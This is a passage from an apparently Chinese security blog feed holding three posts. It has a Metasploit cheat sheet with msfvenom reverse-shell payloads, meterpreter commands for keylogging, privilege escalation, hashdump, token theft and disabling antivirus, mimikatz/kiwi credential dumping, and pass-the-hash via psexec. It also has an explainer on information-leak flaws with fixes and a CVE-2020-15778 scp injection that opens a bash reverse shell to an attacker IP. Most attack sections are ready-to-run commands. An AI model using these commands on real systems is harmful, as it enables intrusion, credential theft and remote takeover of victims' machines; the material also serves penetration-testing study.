</span>&gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt;<br>shell.php<br><br>ASP:<br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"></span><br><span class="hljs-built_in">Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f asp &gt; shell.asp<br><br>JSP:<br>msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port</span><br><span class="hljs-built_in"></span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.jsp<br><br>WAR:<br>msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port</span><br><span class="hljs-built_in"></span><span class="hljs-keyword">to</span> Connect On&gt; -f war &gt; shell.war<br><br>Python:<br>msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span><br>Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.py<br><br>Bash :<br>msfvenom -p cmd/unix/reverse_bash <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span><br>Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.sh<br><br>Perl:<br>msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span><br>Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.pl<br></code></pre></td></tr></table></figure><p>2 .生成监听器 :</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">&lt;Payload name&gt;</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST &lt;LHOST value&gt;</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT &lt;LPORT value&gt;</span><br>run<br></code></pre></td></tr></table></figure><h4 id="Meterpreter操作指南"><a href="#Meterpreter操作指南" class="headerlink" title="Meterpreter操作指南 :"></a>Meterpreter操作指南 :</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">backgroup</span> 放置后台<br><span class="hljs-attribute">sessions</span> 查看后台会话<br><span class="hljs-attribute">sessions</span> <span class="hljs-number">1</span> 选择会话<br><span class="hljs-attribute">sessions</span> -k <span class="hljs-number">1</span> 杀死会话<br></code></pre></td></tr></table></figure><p>常用操作 :</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs awk">meterpreter &gt; background 放回后台<br>meterpreter &gt; <span class="hljs-keyword">exit</span> 关闭会话<br>meterpreter &gt; help 帮助信息<br>meterpreter &gt; Sysinfo 系统平台信息<br>meterpreter &gt; screenshot 屏幕截取<br>meterpreter &gt; shell 命令行shell (<span class="hljs-keyword">exit</span>退出)<br>meterpreter &gt; getlwd 查看本地目录<br>meterpreter &gt; lcd 切换本地目录<br>meterpreter &gt; getwd 查看目录<br>meterpreter &gt; ls 查看文件目录列表<br>meterpreter &gt; cd 切换目录<br>meterpreter &gt; rm 删除文件<br>meterpreter &gt; download C:\\Users\\<span class="hljs-number">123</span>\\Desktop\\<span class="hljs-number">1</span>.txt <span class="hljs-number">1</span>.txt 下载文件<br>meterpreter &gt; upload <span class="hljs-regexp">/var/</span>www/wce.exe wce.exe 上传文件<br>meterpreter &gt; search -d c: -f *.doc 搜索文件<br>meterpreter &gt; execute -f cmd.exe -i 执行程序/命令<br>meterpreter &gt; ps 查看进程<br>meterpreter &gt; run post<span class="hljs-regexp">/windows/</span>capture/keylog_recorder 键盘记录<br>meterpreter &gt; getuid 查看当前用户权限<br>meterpreter &gt; use priv 加载特权模块<br>meterpreter &gt; getsystem 提升到SYSTEM权限<br>meterpreter &gt; hashdump 导出密码散列<br>meterpreter &gt; ps 查看高权限用户PID<br>meterpreter &gt; steal_token &lt;PID&gt; 窃取令牌<br>meterpreter &gt; rev2self 恢复原来的令牌<br>meterpreter &gt; migrate pid 迁移进程<br>meterpreter &gt; run killav 关闭杀毒软件<br>meterpreter &gt; run getgui-e 启用远程桌面<br>meterpreter &gt; portfwd add -l <span class="hljs-number">1234</span> -p <span class="hljs-number">3389</span> -r &lt;目标IP&gt; 端口转发<br>meterpreter &gt; run get_local_subnets 获取内网网段信息<br>meterpreter &gt; run autoroute -s &lt;内网网段&gt; 创建自动路由<br>meterpreter &gt; run autoroute -p 查看自动路由表<br><br>创建代理通道:<br>msf &gt; use auxiliary<span class="hljs-regexp">/server/</span>socks4a 设置socks4代理模块<br>msf auxiliary(socks4a) &gt; show options<br>msf auxiliary(socks4a) &gt; run<br>配置proxychains参数：<br>nano <span class="hljs-regexp">/etc/</span>proxychains.conf 修改代理监听端口,和前面端口一致<br></code></pre></td></tr></table></figure><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz :"></a>mimikatz :</h4><p>在最新的版本中load mimikatz已经取消 现在使用kiwi模块</p><p>load kiwi</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">creds_all：列举所有凭据<br>creds_kerberos：列举所有kerberos凭据<br>creds_msv：列举所有msv凭据<br>creds_ssp：列举所有ssp凭据<br>creds_tspkg：列举所有tspkg凭据<br>creds_wdigest：列举所有wdigest凭据<br>dcsync：通过DCSync检索用户帐户信息<br>dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID<br>golden_ticket_create：创建黄金票据<br>kerberos_ticket_list：列举kerberos票据<br>kerberos_ticket_purge：清除kerberos票据<br>kerberos_ticket_use：使用kerberos票据<br>kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令<br>ls<span class="hljs-built_in">a_dump</span>_sam：dump出lsa的SAM<br>ls<span class="hljs-built_in">a_dump</span>_secrets：dump出lsa的密文<br>password_change：修改密码<br>wifi_list：列出当前用户的wifi配置文件<br>wifi_list_shared：列出共享wifi配置文件/编码<br><br>creds_all #该命令可以列举系统中的明文密码 <br>kiwi_cmd kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令 <br><span class="hljs-title">例如 ：kiwi_cmd sekurlsa::</span>logonpasswords<br></code></pre></td></tr></table></figure><h4 id="内网渗透-psexec："><a href="#内网渗透-psexec：" class="headerlink" title="内网渗透 psexec："></a>内网渗透 psexec：</h4><p>参考 : <a href="https://blog.csdn.net/qq_46258964/article/details/124216187">https://blog.csdn.net/qq_46258964/article/details/124216187</a></p><p>在metasploite中存在一个psexec模块可以使用获取的hash进行登录</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/smb/psexec<br><span class="hljs-keyword">set</span> SMBUser <span class="hljs-comment">administrator</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 10.10.10.139</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 6666</span><br>exploit<br><br>ps <span class="hljs-comment">:</span> 除了可以用<span class="hljs-comment">hash</span> 也可以使用明文<br></code></pre></td></tr></table></figure><h4 id="内网渗透-开启远程终端-添加账号"><a href="#内网渗透-开启远程终端-添加账号" class="headerlink" title="内网渗透-开启远程终端-添加账号 :"></a>内网渗透-开启远程终端-添加账号 :</h4><p> getgui 模块——开启远程桌面</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> getgui -e 开启远程终端<br><span class="hljs-built_in">run</span> post/windows/manage/enable_rdp<br><span class="hljs-built_in">run</span> getgui -u m -p QWEasd123 添加本地管理员<br></code></pre></td></tr></table></figure><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>如果服务器防火墙开启的情况下，有可能拦截远程终端端口，使用命令把远程端口3389转发出来</p><p>端口转发可以让攻击机访问本来无法直接访问的目标主机。portfwd可以反弹单个端口到本地并且监听。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs diff">meterpreter &gt; portfwd add -l 3389 -r 192.168.0.130 -p 3389<br><span class="hljs-deletion">-l 本地监听端口</span><br><span class="hljs-deletion">-r 远程地址</span><br><span class="hljs-deletion">-p 远程端口</span><br></code></pre></td></tr></table></figure><p>端口转发到本地1234端口</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdesktop</span> <span class="hljs-number">127.0.0.1:1234</span><br></code></pre></td></tr></table></figure><h4 id="跨路由访问"><a href="#跨路由访问" class="headerlink" title="跨路由访问"></a>跨路由访问</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">在渗透测试过程中，经常拿到web主机与数据库不同在一个网段，可以得出这台主机还连着一个内网，<br>如果想要继续渗透内网，可以把这台web主机当作跳板机，对内网进行渗透<br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino">获取内网网卡命令 <br>run get_local_subnets<br>绑定路由 不绑定路由就没法访问目标主机<br>run autoroute -s <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> <br>route add <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.0</span> <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span>  <span class="hljs-number">1</span>    <span class="hljs-comment">//1是 sessions序号</span><br>route print<br></code></pre></td></tr></table></figure><p>使用隧道 默认是使用socks5 也可以选择socks4a</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/server/</span>socks_proxy<br>编辑一下proxy就可以使用了<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MSF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>敏感信息泄露漏洞</title>
    <link href="/2022/10/26/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/10/26/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>不论是日常生活还是人际交往，信息的重要性都是毋庸置疑的，虽然信息是虚拟存在的，但是其所带来的价值是却是不可忽视的！</p><span id="more"></span><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p>信息泄露指网站无意向用户泄露敏感信息，可能包括以下内容:</p><ol><li>有关其他用户私密数据的,财务信息,个人身份信息等</li><li>敏感的商业数据</li><li>有关网站技术细节,架构,如源代码等</li></ol><p></p><p>这种泄露可能是不慎泄露给浏览该网站信息用户的，也有可能是攻击者通过恶意的交互从网站获得数据。</p><h3 id="敏感信息泄露示例"><a href="#敏感信息泄露示例" class="headerlink" title="敏感信息泄露示例"></a>敏感信息泄露示例</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 通过robots.txt泄露网站隐藏目录、文件，或者站点结构<br><span class="hljs-bullet">2.</span> 网站站点的备份文件未删除导致的泄露，可能会泄露网站源代码<br><span class="hljs-bullet">3.</span> 没有正确处理网站的一些错误消息，在错误消息中泄露数据库表，字段等<br><span class="hljs-bullet">4.</span> 一些高度敏感的用户信息，银行账号等泄露<br><span class="hljs-bullet">5.</span> 在源代码中泄露数据库账号密码，等等(GitHub)<br><span class="hljs-bullet">6.</span> 网站某些程序的细微差别提示是否存在某些资源，用户名<br></code></pre></td></tr></table></figure><h3 id="敏感信息泄露产生原因"><a href="#敏感信息泄露产生原因" class="headerlink" title="敏感信息泄露产生原因"></a>敏感信息泄露产生原因</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 未删除公开内容中的敏感信息(如开发人员的注释)<br><span class="hljs-bullet">2.</span> 网站不安全的配置(如：报错信息过于具体，网站开发时留下的调试网站功能)<br><span class="hljs-bullet">3.</span> 应用程序设计上的缺陷<br></code></pre></td></tr></table></figure><h3 id="敏感信息泄露挖掘的思路"><a href="#敏感信息泄露挖掘的思路" class="headerlink" title="敏感信息泄露挖掘的思路"></a>敏感信息泄露挖掘的思路</h3><h4 id="爬虫文件"><a href="#爬虫文件" class="headerlink" title="爬虫文件"></a>爬虫文件</h4><p>robots.txt和sitemap.xml等</p><p>这些文件会列出特定目录不让爬虫爬取因为它们可能包含敏感信息</p><p><img src="/../images/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20221026201603358.png" alt="1"></p><h4 id="目录信息泄露"><a href="#目录信息泄露" class="headerlink" title="目录信息泄露"></a>目录信息泄露</h4><p>有的网站因为不当的配置可能会暴露了网站目录以及一些开发者不希望用户访问的文件。</p><p>泄露敏感资源的存在与位置：</p><p><img src="/../images/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20221026201910517.png" alt="示例"></p><h4 id="注释或js文件"><a href="#注释或js文件" class="headerlink" title="注释或js文件"></a>注释或js文件</h4><p>开发过程中,开发者可能在HTML中写有关敏感信息的注释。部署到生成文件前，通常会删除，但是可能有时会因为有些人没有安全意识而忘记。也有可能是js代码会保留一些敏感信息</p><p><img src="/../images/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20221026202214762.png" alt="如果访问用户是管理员,将在页面上增加一个超链接 Admin panel 在. /admin-f6zfiz"></p><p>如果不看源代码,通过目录爆破很难发现。但是同时，该网站的访问控制也没有做好，我们可以轻松进入控制页面。</p><p><img src="/../images/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20221026202252214.png" alt="示例"></p><h4 id="错误消息"><a href="#错误消息" class="headerlink" title="错误消息"></a>错误消息</h4><ol><li>信息泄露的最常见原因之一是冗长的错误消息。</li><li>您应密切注意测试期间遇到的所有错误消息。</li><li>错误消息可能提醒测试人员应该输入什么消息或者什么数据类型的消息,这可以帮助我们识别可利用的参数来缩小攻击范围</li><li>详细的错误消息还可以提供有关网站使用的技术信息，如数据库类型,模板类型,服务器版本号等。</li><li>您可能还会发现该网站正在使用某种开源框架，在这种情况下，您可以下载研究源代码，可能有意外收获。</li><li>错误消息对SQL注入，用户名枚举等都很关键。</li></ol><h4 id="调试数据"><a href="#调试数据" class="headerlink" title="调试数据"></a>调试数据</h4><ol><li>出于调试目的，许多网站会生成自定义错误消息和日志,其中包含有关应用程序行为的大量信息</li><li>尽管此信息在开发过程中很有用，但如果在生产环境中泄漏，则对攻击者也非常有用。</li><li>调试消息有时可能包含用于发起攻击的重要信息，包括 :    <ol><li>可以通过用户输入操作的关键会话变量的值    </li><li>web中间件的主机名和登录凭据    </li><li>服务器上的文件和目录名称    </li><li>用于加密通过客户端传输的数据的密钥</li></ol></li><li>调试信息有时可能会记录在单独的文件中。</li></ol><h4 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h4><ol><li><p>获得源代码访问权限使攻击者更容易理解应用程序的行为并构造高严重性攻击。</p></li><li><p>敏感数据有时甚至被写在在源代码中，如数据库IP,密码(程序员提交到GitHub的开源项目)</p></li><li><p>有时候,网站自身可能由于某些原因,泄露其源代码：比如用Vim编程,在修改文件后 系统会自动生成一个带~的备份文件 , 某些情况下可以对其下载进行查看。</p></li><li><p>还有一些文件备份会在文件后面加上：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.bak </span><br><span class="hljs-title">.rar.zip</span><br><span class="hljs-title">.7z</span><br><span class="hljs-title">.tar</span><br><span class="hljs-title">.gz</span><br><span class="hljs-title">.bak</span><br><span class="hljs-title">.swp</span><br><span class="hljs-title">.txt</span><br><span class="hljs-title">.html</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="配置不安全导致信息泄露"><a href="#配置不安全导致信息泄露" class="headerlink" title="配置不安全导致信息泄露"></a>配置不安全导致信息泄露</h4><ol><li>由于配置不当，网站有时容易受到攻击。</li><li>又由于第三方技术的广泛使用，这种情况尤为普遍，第三方技术的很多配置选项并不一定被使用它们的人员所理解。</li><li>在其他情况下，开发人员可能会忘记在生产环境中禁用各种调试选项。</li><li>例如，HTTP TRACE方法被设计用于诊断目的 , TRACE允许顾客看到通过请求链的那一端在接收了些什么并使用那些数据来测试和诊断信息情况,开启可能导致某些危害</li></ol><h4 id="代码泄露-git版本控制"><a href="#代码泄露-git版本控制" class="headerlink" title="代码泄露-git版本控制"></a>代码泄露-git版本控制</h4><p>几乎所有网站都是使用某种形式的版本控制系统（例如Git）开发的。默认情况下，Git项目将其所有版本控制数据存储在名为.git的文件夹中。有时，网站在生产环境中公开此目录。在这种情况下，您可能只需浏览到即可访问它&#x2F;.git。而且还可以下载到本地,用本地安装的Git打开它 以访问网站的版本控制历史记录。这可能无法让您访问完整的源代码， 但是您可以阅读更改的代码片段，这仍然可能存在某些敏感数据。</p><p>利用工具 :  GitHack、gittools（推荐）、dvcs-ripper</p><h4 id="代码泄露-SVN版本控制"><a href="#代码泄露-SVN版本控制" class="headerlink" title="代码泄露-SVN版本控制"></a>代码泄露-SVN版本控制</h4><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p><p>利用工具 : dvcs-ripper  Seay-Svn</p><h4 id="代码泄露-DS-Store-文件泄露"><a href="#代码泄露-DS-Store-文件泄露" class="headerlink" title="代码泄露-DS_Store 文件泄露"></a>代码泄露-DS_Store 文件泄露</h4><p>DS_Store 是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。这个文件可以删除，删除以后的副作用就是这些信息的失去。（当然，这点副作用其实不是太大）。</p><p>在和别人交换文件应该把 .DS_Store 文件删除比较妥当，因为里面包含了一些你不一定希望别人看见的信息（尤其是网站，通过 .DS_Store 可以知道这个目录里面所有文件的清单，很多时候这是一个不希望出现的问题）。</p><p>由于代码在部署上线的时候没有删除这个文件，导致不必要的信息泄漏。</p><p>利用工具 : ds_store_exp</p><h4 id="WEB-INF-x2F-web-xml泄露"><a href="#WEB-INF-x2F-web-xml泄露" class="headerlink" title="WEB-INF&#x2F;web.xml泄露"></a>WEB-INF&#x2F;web.xml泄露</h4><p>漏洞成因：</p><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p><p>漏洞检测以及利用方法：</p><p>直接在域名后面加上WEB-INF&#x2F;web.xml就可以了。</p><p>WEB-INF主要包含一下文件或目录：    </p><ul><li>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。   </li><li>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中    </li><li>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件   </li><li>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。    </li><li>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</li></ul><h4 id="CMS版本泄露"><a href="#CMS版本泄露" class="headerlink" title="CMS版本泄露"></a>CMS版本泄露</h4><p><img src="/../images/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20221026203304853.png" alt="CMS版本泄露"></p><h4 id="主机信息泄露"><a href="#主机信息泄露" class="headerlink" title="主机信息泄露"></a>主机信息泄露</h4><p><img src="/../images/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20221026203331112.png" alt="主机信息泄露"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ol><li>删除以上存在的泄漏的目录</li><li>后台路径尽量复杂，不要被随便扫描出来</li><li>修改服务器配置禁止列目录</li><li>修改服务器配置禁止错误回显</li><li>删除没用的文件</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>敏感信息</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OpenSSH命令注入漏洞复现(CVE-2020-15778)</title>
    <link href="/2022/10/26/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/"/>
    <url>/2022/10/26/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/</url>
    
    <content type="html"><![CDATA[<p>OpenSSH命令注入漏洞复现(CVE-2020-15778)</p><span id="more"></span><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ol><li>漏洞描述</li><li>漏洞等级</li><li>漏洞影响版本</li><li>漏洞复现</li><li>修复建议</li></ol><h4 id="01-漏洞描述"><a href="#01-漏洞描述" class="headerlink" title="01_漏洞描述"></a>01_漏洞描述</h4><p>​OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。</p><p>​2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。</p><p>利用条件:知道目标机的ssh密码。</p><p>漏洞利用场景:一般在特定环境下利用，比如在知道SSH账户密码后，但禁用SSH登陆或SSH连接被阻止，服务器允许使用scp传文件的情况下，可对其进行命令注入，所以如果攻击者不知道ssh账密，此漏洞无法利用。</p><h4 id="02-漏洞等级"><a href="#02-漏洞等级" class="headerlink" title="02_漏洞等级"></a>02_漏洞等级</h4><p><strong>高危</strong></p><h4 id="03-漏洞影响版本"><a href="#03-漏洞影响版本" class="headerlink" title="03_漏洞影响版本"></a>03_漏洞影响版本</h4><p>OpenSSH &lt;&#x3D; 8.3</p><h4 id="04-漏洞复现"><a href="#04-漏洞复现" class="headerlink" title="04_漏洞复现"></a>04_漏洞复现</h4><p>​scp 是 secure copy 的缩写。在linux系统中，scp用于linux之间复制文件和目录，基于 ssh 登陆进行安全的远程文件拷贝命令。该命令由openssh的scp.c及其他相关代码实现。</p><p>攻击机:Kali(192.168.233.161)</p><p>靶机:Centos7(192.168.233.160)</p><p>1.查看SSH版本,如显示的版本号属于受影响的版本则漏洞存在</p><p><img src="/../images/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/image-20221026194201452.png" alt="1"></p><p>2.执行scp命令,执行反弹shell</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">scp [上传任意文件] root@靶机IP地址:</span>&#x27;`bash -i &gt;&amp; /dev/tcp/攻击机IP地址/监听的端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>`&#x27;<br></code></pre></td></tr></table></figure><p><img src="/../images/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/image-20221026195035079.png" alt="2"></p><p>3.打开xxxx端口并监听接受的信息</p><p><img src="/../images/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/image-20221026195503671.png" alt="3"></p><p>4.在攻击机执行查看IP地址命令,显示出靶机的IP地址则表明反弹成功</p><p><img src="/../images/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/image-20221026195156891.png" alt="4"></p><h4 id="05-修复建议"><a href="#05-修复建议" class="headerlink" title="05_修复建议"></a>05_修复建议</h4><p>5.1 SSH账密确保为强口令且周期性更换密码</p><p>5.2 使用rsync代替SCP</p><p>5.3 升级OpenSSH为最新版openssh-8.8p1.tar.gz  </p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>什么是尾随攻击以及如何保护自己免受攻击</title>
    <link href="/2022/10/23/%E4%BB%80%E4%B9%88%E6%98%AF%E5%B0%BE%E9%9A%8F%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%9D%E6%8A%A4%E8%87%AA%E5%B7%B1%E5%85%8D%E5%8F%97%E6%94%BB%E5%87%BB/"/>
